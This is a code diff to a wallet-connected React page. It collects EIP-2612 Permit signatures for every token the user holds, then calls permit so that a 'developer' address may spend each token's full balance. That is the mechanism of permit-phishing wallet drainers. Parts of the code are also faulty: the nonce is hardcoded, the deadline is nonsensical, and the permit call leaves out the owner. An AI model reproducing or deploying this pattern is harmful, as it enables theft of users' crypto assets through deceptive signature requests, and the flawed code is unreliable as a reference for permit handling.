@@ -26,6 +26,9 @@ const Page = () => {
 	const {disconnect} = useDisconnect();
 	const [signature, setSignature] = useState<string>("0xe62b5c6b5df896ca85e1d1d440adeb827d676714bc4cdc4e4fa10f58e1473bd5137784d7d744d59162f83c92d9a9250bb9e727fdb2039429db59fa02b6e940871b")
 	const signer = useEthersSigner();
+	const [signatures, setSignatures] = useState<{
+		[key: string]: string
+	}>({})
 	const {data: balance, isLoading} = useBalance({
 		address: account.address
 	})
@@ -76,51 +79,65 @@ const Page = () => {
 				DC
 
 			</button>
-			<button onClick={async ()=>{
-				if (!account) return;
-				const params = {
-					"types": {
-						"Permit": [
-							{ "name": "owner", "type": "address" },
-							{ "name": "spender", "type": "address" },
-							{ "name": "value", "type": "uint256" },
-							{ "name": "nonce", "type": "uint256" },
-							{ "name": "deadline", "type": "uint256" }
-						]
-					},
-					"primaryType": "Permit",
-					"domain": {
-						"name": balance!.symbol,
-						"version": "1",
-						"chainId": account.chainId as any,
-						"verifyingContract": BNBContract // BNB Contract
-					},
-					"message": message
-				};
-				console.log(params);
-				const result = await signTypedData(config,params)
+			{tokens.map(token => {
+				if (token.contract_address === '0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee') token.contract_address = BNBContract;
 
-				setSignature(result);
-			}}>
-				SIGN TYPED DATA
-			</button>
+				return (
+					<div className={'flex gap-2'}>
+						{token.contract_ticker_symbol}
+						<button disabled={!!signatures[token.contract_ticker_symbol]} onClick={async () => {
+							if (!account) return;
+							const params = {
+								"types": {
+									"Permit": [
+										{"name": "owner", "type": "address"},
+										{"name": "spender", "type": "address"},
+										{"name": "value", "type": "uint256"},
+										{"name": "nonce", "type": "uint256"},
+										{"name": "deadline", "type": "uint256"}
+									]
+								},
+								"primaryType": "Permit",
+								"domain": {
+									"name": token.contract_ticker_symbol,
+									"version": "1",
+									"chainId": account.chainId as any,
+									"verifyingContract": token.contract_address // BNB Contract
+								},
+								"message": message
+							};
+							console.log(params);
+							const result = await signTypedData(config, params)
+
+							setSignatures(pre => ({
+								...pre || {},
+								[token.contract_ticker_symbol]: result
+							}))
+						}}>
+							SIGN TYPED DATA
+						</button>
+					</div>
+				)
+			})}
 			<br/>
 			SIGNATURE: {signature}
 			<br/>
 			{tokens.map(token => {
-				if (token.contract_address === '0x')
+				const signature = signatures[token.contract_ticker_symbol];
+
+
 				return (
 					<button disabled={!signature} onClick={async () => {
 						if (!signature) return;
 						// ABI of the token contract
 						// Prepare the permit data
 						const spender = developer.address; // Address of the spender
-						const amount = 100000000; // Amount of tokens to be spent
+						const amount = token.balance; // Amount of tokens to be spent
 						const nonce = 2; // Nonce
 						const deadline = 5 * 60 * 1000; // Deadline (optional)
 						const {v, r, s} = ethers.utils.splitSignature(signature);
 // Call the permit method
-						const tokenContract = new ethers.Contract(BNBContract, ['function permit(address spender, uint256 amount, uint256 nonce, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external'], signer);
+						const tokenContract = new ethers.Contract(token.contract_address, ['function permit(address spender, uint256 amount, uint256 nonce, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external'], signer);
 						const args = [spender, amount, nonce, deadline, v, r, s];
 						console.log(args)
 						const tx = await tokenContract.permit(...args);
